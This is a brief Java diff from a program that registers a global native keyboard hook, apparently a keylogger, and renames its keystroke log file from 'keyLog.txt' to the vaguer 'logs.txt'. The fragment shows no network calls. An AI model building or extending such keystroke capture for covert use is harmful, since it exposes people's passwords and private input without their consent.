@@ -12,7 +12,7 @@ public class Main implements NativeKeyListener {
         if(args==null || args.length==0)
             fc = new IOWrite();
 
-        fc.initWriter("keyLog.txt");
+        fc.initWriter("logs.txt");
 
         try {
             GlobalScreen.registerNativeHook();
